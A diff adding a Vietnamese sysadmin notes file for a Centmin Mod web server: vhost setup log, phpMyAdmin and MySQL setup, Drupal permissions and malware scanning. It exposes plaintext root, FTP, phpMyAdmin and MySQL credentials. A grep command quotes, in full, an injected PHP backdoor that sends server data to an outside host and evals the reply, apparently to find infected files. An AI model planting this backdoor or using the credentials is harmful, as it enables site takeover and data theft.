@@ -1,0 +1,272 @@
+
+Important Information
+---------------------------------------------------------------
+
+You are about to create an Nginx vhost site account with/without
+HTTPS/SSL support. Details of this process are outlined on site
+at centminmod.com/nginx_domain_dns_setup.html. Also read the
+continually updated Getting Started Guide for Centmin Mod usage
+at centminmod.com/getstarted.html which covers the pure-ftpd
+ftp username that is auto generated with the Nginx vhost site.
+---------------------------------------------------------------
+403 Permission denied message handling
+if after vhost site setup you encounter 403 permission denied errors,
+check https://community.centminmod.com/threads/7308/ to see if your
+site needs tools/autoprotect.sh tweaking/whitelisting
+---------------------------------------------------------------
+[ LETSENCRYPT_DETECT is not enabled ]
+Ignore this message if you do not want HTTPS based web site otherwise
+read below carefully.
+
+Free letsencrypt SSL certificates integration is in beta testing if
+you want to obtain free letsencrypt SSL certificate for HTTPS site,
+you will need to manually enable LETSENCRYPT_DETECT='y' outlined
+at https://centminmod.com/acmetool so exit this vhost routine first
+set LETSENCRYPT_DETECT='y' and update domain DNS A record first
+then re-run vhost site creation menu option
+---------------------------------------------------------------
+
+Do you want to continue with Nginx vhost site creation ? [y/n] y
+
+Enter vhost domain name to add (without www. prefix): nuce.edu.vn
+
+Create a self-signed SSL certificate Nginx vhost? [y/n]: y
+
+Create FTP username for vhost domain (enter username): nuceeduvn
+Auto generate FTP password (recommended) [y/n]: n
+Create FTP password for nuceeduvn (enter password): tttT@@2020
+
+FTP username you entered: nuceeduvn
+FTP password you entered: tttT@@2020
+
+Password:
+Enter it again:
+---------------------------------------------------------------
+SSL Vhost Setup...
+---------------------------------------------------------------
+
+--2019-06-07 19:22:01--  https://support.cloudflare.com/hc/en-us/article_attachments/201243967/origin-pull-ca.pem
+Resolving support.cloudflare.com... 104.16.53.111, 104.16.54.111, 104.16.55.111, ...
+Connecting to support.cloudflare.com|104.16.53.111|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2151 (2.1K) [application/x-x509-ca-cert]
+Saving to: ‘origin.crt’
+
+     0K ..                                                    100% 24.3M=0s
+
+2019-06-07 19:22:02 (24.3 MB/s) - ‘origin.crt’ saved [2151/2151]
+
+---------------------------------------------------------------
+Generating self signed SSL certificate...
+CSR file can also be used to be submitted for paid SSL certificates
+If using for paid SSL certificates be sure to keep both private key and CSR safe
+creating CSR File: nuce.edu.vn.csr
+creating private key: nuce.edu.vn.key
+creating self-signed SSL certificate: nuce.edu.vn.crt
+Generating a 2048 bit RSA private key
+...............................................................................................................................................................+++
+......+++
+writing new private key to 'nuce.edu.vn.key'
+-----
+Signature ok
+subject=/C=US/ST=California/L=Los Angeles/O=nuce.edu.vn/OU=nuce.edu.vn/CN=nuce.edu.vn
+Getting Private key
+
+---------------------------------------------------------------
+Copy/setup dhparam.pem file...
+
+-------------------------------------------------------------
+generated nginx include file [initial]: /usr/local/nginx/conf/autoprotect/nuce.edu.vn/autoprotect-nuce.edu.vn.conf
+generated nginx include file [initial]: /usr/local/nginx/conf/autoprotect/nuce.edu.vn_tam/autoprotect-nuce.edu.vn_tam.conf
+
+autoprotect.sh run completed...
+
+Reloading nginx configuration (via systemctl):  [  OK  ]
+service nginx reload
+Reloading nginx configuration (via systemctl):  [  OK  ]
+systemctl restart pure-ftpd.service
+
+-------------------------------------------------------------
+FTP hostname : 10.20.0.47
+FTP port : 21
+FTP mode : FTP (explicit SSL)
+FTP Passive (PASV) : ensure is checked/enabled
+FTP username created for nuce.edu.vn : nuceeduvn
+FTP password created for nuce.edu.vn : tttT@@2020
+-------------------------------------------------------------
+vhost for nuce.edu.vn created successfully
+
+domain: http://nuce.edu.vn
+vhost conf file for nuce.edu.vn created: /usr/local/nginx/conf/conf.d/nuce.edu.vn.conf
+vhost ssl for nuce.edu.vn created successfully
+domain: https://nuce.edu.vn
+vhost ssl conf file for nuce.edu.vn created: /usr/local/nginx/conf/conf.d/nuce.edu.vn.ssl.conf
+/usr/local/nginx/conf/ssl_include.conf created
+Self-signed SSL Certificate: /usr/local/nginx/conf/ssl/nuce.edu.vn/nuce.edu.vn.crt
+SSL Private Key: /usr/local/nginx/conf/ssl/nuce.edu.vn/nuce.edu.vn.key
+SSL CSR File: /usr/local/nginx/conf/ssl/nuce.edu.vn/nuce.edu.vn.csr
+Backup SSL Private Key: /usr/local/nginx/conf/ssl/nuce.edu.vn/nuce.edu.vn-backup.key
+Backup SSL CSR File: /usr/local/nginx/conf/ssl/nuce.edu.vn/nuce.edu.vn-backup.csr
+upload files to /home/nginx/domains/nuce.edu.vn/public
+vhost log files directory is /home/nginx/domains/nuce.edu.vn/log
+-------------------------------------------------------------
+Current vhost listing at: /usr/local/nginx/conf/conf.d/
+May 30  22:28   1.5K   virtual.conf
+May 30  22:28   2.2K   phpmyadmin_ssl.conf
+Jun 7   19:22   2.2K   nuce.edu.vn.conf
+Jun 7   19:22   4.1K   nuce.edu.vn.ssl.conf
+-------------------------------------------------------------
+Current vhost ssl files listing at: /usr/local/nginx/conf/ssl/nuce.edu.vn
+May 25  12:07   424    dhparam.pem
+Jun 7   19:22   1.7K   nuce.edu.vn.key
+Jun 7   19:22   1.1K   nuce.edu.vn.csr
+Jun 7   19:22   1.3K   nuce.edu.vn.crt
+-------------------------------------------------------------
+Commands to remove nuce.edu.vn
+pure-pw userdel nuceeduvn
+ rm -rf /usr/local/nginx/conf/conf.d/nuce.edu.vn.conf
+ rm -rf /usr/local/nginx/conf/conf.d/nuce.edu.vn.ssl.conf
+ rm -rf /usr/local/nginx/conf/ssl/nuce.edu.vn/nuce.edu.vn.crt
+ rm -rf /usr/local/nginx/conf/ssl/nuce.edu.vn/nuce.edu.vn.key
+ rm -rf /usr/local/nginx/conf/ssl/nuce.edu.vn/nuce.edu.vn.csr
+ rm -rf /usr/local/nginx/conf/ssl/nuce.edu.vn
+ rm -rf /home/nginx/domains/nuce.edu.vn
+ rm -rf /root/.acme.sh/nuce.edu.vn
+ rm -rf /root/.acme.sh/nuce.edu.vn_ecc
+ rm -rf /usr/local/nginx/conf/pre-staticfiles-local-nuce.edu.vn.conf
+ service nginx restart
+-------------------------------------------------------------
+vhost for nuce.edu.vn setup successfully
+nuce.edu.vn setup info log saved at:
+/root/centminlogs/centminmod_123.09beta01.b078_070619-192054_nginx_addvhost.log
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+------------------------------------------------------
+Change SSH
+- Port: 22 => 101
+- Pass root: sudo passwd root (Nuce@123Nuce@123)
+
+------------------------------------------------------
+CÀI PHP MYADMIN
+- /root/tools/phpmyadmin_uninstall.sh
+- cd /usr/local/src/centminmod/addons/
+- chmod 0700 /usr/local/src/centminmod/addons/phpmyadmin.sh
+- ./phpmyadmin.sh install
+
+THÔNG TIN PHPMYADMIN
+
+- https://vps.chinhban.com/4636_mysqladmin30057
+- Username: adminD2UMreP8gU=
+- Password: RkszEW4CGRSTGTWU47H4xC51A=
+
+
+CHO PHÉP VÀO TỪ MỌI IP
+- nano /usr/local/nginx/conf/phpmyadmin_https.conf
+- deny all; => allow all; 
+- Hoặc cho phép những IP tĩnh sau:
+  #IP TINH O DHXD
+  allow 117.1.16.201;
+  allow 117.1.16.202;
+  allow 117.1.16.203;
+  allow 117.1.16.204;
+  allow 117.1.16.205;
+  allow 117.1.16.206;
+  allow 117.4.240.19;
+  allow 27.72.100.108;
+  allow 118.70.118.138;
+  allow 118.70.116.23;
+  allow 123.16.13.116;
+  allow 117.6.85.13;
+  allow 117.6.132.144;
+  allow 117.6.87.43;
+  #IP O GIAP BAT
+  allow 27.73.110.179;
+  deny all;
+- File lưu USER và PASS web access: /usr/local/nginx/conf/htpassphpmyadmin;
+
+------------------------------------------------------
+ CÀI CHƯƠNG TRÌNH DIỆT VIRUT MALDET:
+ - Update CSDL: maldet -d
+ - Quét: maldet -a /home/nginx/domains/nuce.edu.vn
+ 
+ - Hướng dẫn: https://www.woktron.com/secure/knowledgebase/145/Installation-Linux-Malware-Detect-Maldet-On-CentOS.html
+ - https://centminmod.com/addons.html#maldet
+ 
+------------------------------------------------------
+TẠO TÀI KHOẢN MYSQL & THAY PASS root\Nuce@123Nuce@123:
+- CREATE USER 'admin2fdYdJWcBmc='@'localhost' IDENTIFIED BY 'LPg5DW0uJEwogEeB5TLKiV1QDOI=';
+- GRANT ALL PRIVILEGES ON * . * TO 'admin2fdYdJWcBmc='@'localhost';
+- FLUSH PRIVILEGES;
+
+TEST:
+- mysql -u admin2fdYdJWcBmc= -p
+- LPg5DW0uJEwogEeB5TLKiV1QDOI=
+
+------------------------------------------------------
+CẤU HÌNH FILE CONFIG /usr/local/nginx/conf/conf.d/
+# quang them loi khong hien thi anh
+  location @rewrite {
+    rewrite ^ /index.php last;
+  }
+  location ~* files/styles {
+    access_log off;
+    expires 30d;
+    try_files $uri @rewrite;
+  }
+  location / {
+    try_files $uri $uri/ /index.php?$args;
+    include /usr/local/nginx/conf/503include-only.conf; 
+    
+ ------------------------------------------------------
+ PHÂN QUYỀN CÁC THƯ MỤC TRONG DRUPAL 7
+- cd /home/nginx/domains/nuce.edu.vn/public
+- find . -type d -exec chmod 0555 {} \;
+- find . -type f -exec chmod 0444 {} \;
+- find sites/default/files -type d -exec chmod 0755 {} \;
+- find sites/default/files -type f -exec chmod 0644 {} \;
+- there should be no "tmp" directory at drupal root , place tmp outside where hackers can not access with weburl
+- https://help.directadmin.com/item.php?id=589
+TÌM MỘT FILE
+- find . -type f -name '*.php'
+
+- find /home/quangtv.nuce.edu.vn/public_html/ -type f -exec grep -l '#page-title' {} \;
+find . -type f -exec grep -l '<?php /*8968665*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KCmlmKCRwYXRjaGVkZnYgPT09ICJHSEtBU01WRyIgKSB7IEBvYl9lbmRfY2xlYW4oKTsgIGRpZTsgIH0KCi8vaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly9ub3J0c2VydmlzLm5ldC9zZXNzaW9uLnBocD9pZCIsIGZhbHNlICwkY29udGV4dF9qaGtiKTsKaWYoJHZrZnUpIHsgQGV2YWwoJHZrZnUpOyB9IGVsc2Uge29iX3N0YXJ0KCk7ICBpZighQGhlYWRlcnNfc2VudCgpKSB7IEBzZXRjb29raWUoImNvbmR0aW9ucyIsIjIiLHRpbWUoKSsxNzI4MDApOyB9IGVsc2UgeyBlY2hvICI8c2NyaXB0PmRvY3VtZW50LmNvb2tpZT0nY29uZHRpb25zPTI7IHBhdGg9LzsgZXhwaXJlcz0iLmRhdGUoJ0QsIGQtTS1ZIEg6aTpzJyx0aW1lKCkrMTcyODAwKS4iIEdNVDsnOzwvc2NyaXB0PiI7IH0gO307CiB9CiB9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*8968665*/ ?>' {} \;
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+TOOL kiểm tra blacklist: https://mxtoolbox.com/Public/Login.aspx#/
+
+Nhật ký Block LDF:
+- /var/log/lfd.log.
+
+HTACCESS_LOG = "/var/log/httpd/error_log"
+MODSEC_LOG = "/var/log/httpd/error_log"
+SSHD_LOG = "/var/log/secure"
+SU_LOG = "/var/log/secure"
+FTPD_LOG = "/var/log/messages"
+SMTPAUTH_LOG = "/var/log/secure"
+POP3D_LOG = "/var/log/maillog"
+IMAPD_LOG = "/var/log/maillog"
+IPTABLES_LOG = "/var/log/messages"
+SUHOSIN_LOG = "/var/log/messages"
+BIND_LOG = "/var/log/messages"
+SYSLOG_LOG = "/var/log/messages"
+WEBMIN_LOG = "/var/log/secure"
+
+XÓA MỘT SITE TRONG CENTMINMOD
+Commands to remove dr9.chinhban.com
+pure-pw userdel dr9
+ rm -rf /usr/local/nginx/conf/conf.d/dr9.chinhban.com.conf
+ rm -rf /usr/local/nginx/conf/conf.d/dr9.chinhban.com.ssl.conf
+ rm -rf /usr/local/nginx/conf/ssl/dr9.chinhban.com/dr9.chinhban.com.crt
+ rm -rf /usr/local/nginx/conf/ssl/dr9.chinhban.com/dr9.chinhban.com.key
+ rm -rf /usr/local/nginx/conf/ssl/dr9.chinhban.com/dr9.chinhban.com.csr
+ rm -rf /usr/local/nginx/conf/ssl/dr9.chinhban.com
+ rm -rf /home/nginx/domains/dr9.chinhban.com
+ rm -rf /root/.acme.sh/dr9.chinhban.com
+ rm -rf /root/.acme.sh/dr9.chinhban.com_ecc
+ rm -rf /usr/local/nginx/conf/pre-staticfiles-local-dr9.chinhban.com.conf
+ service nginx restart
+
+
+<?php /*8968665*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT0$
